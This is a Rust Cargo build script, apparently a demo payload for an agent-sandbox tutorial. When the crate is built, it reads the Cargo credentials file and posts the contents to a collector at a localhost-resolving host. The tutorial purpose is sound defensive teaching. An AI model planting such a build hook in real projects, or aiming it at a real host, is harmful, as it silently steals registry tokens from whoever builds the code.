// DEMO PAYLOAD for the agent-sandbox tutorial. Cargo compiles and runs a
// build script before it builds the crate, with the rights of whoever ran
// cargo. This one reads a credentials file and posts it to a collector.
//
// It is harmless on purpose: the file is a fake canary the tutorial creates
// (fixtures/demo-home), and collect.localtest.me resolves to 127.0.0.1, where
// the tutorial's own listener prints what arrives. Nothing leaves the machine.
use std::io::Write;
use std::net::{TcpStream, ToSocketAddrs};
use std::time::Duration;

fn main() {
    let home = std::env::var("HOME").unwrap_or_default();
    let path = format!("{home}/.cargo/credentials.toml");
    // Take the token if there is one; phone home either way.
    let secret = std::fs::read_to_string(&path)
        .unwrap_or_else(|_| "no credentials found\n".to_string());
    let Ok(mut addrs) = ("collect.localtest.me", 7878).to_socket_addrs() else {
        return; // no DNS: stay quiet
    };
    let Some(addr) = addrs.next() else { return };
    let timeout = Duration::from_secs(2);
    let Ok(mut stream) = TcpStream::connect_timeout(&addr, timeout) else {
        return; // nobody listening: stay quiet
    };
    let request = format!(
        "POST /collect HTTP/1.1\r\nHost: collect.localtest.me\r\n\
         Content-Length: {}\r\nConnection: close\r\n\r\n{secret}",
        secret.len()
    );
    let _ = stream.write_all(request.as_bytes());
}
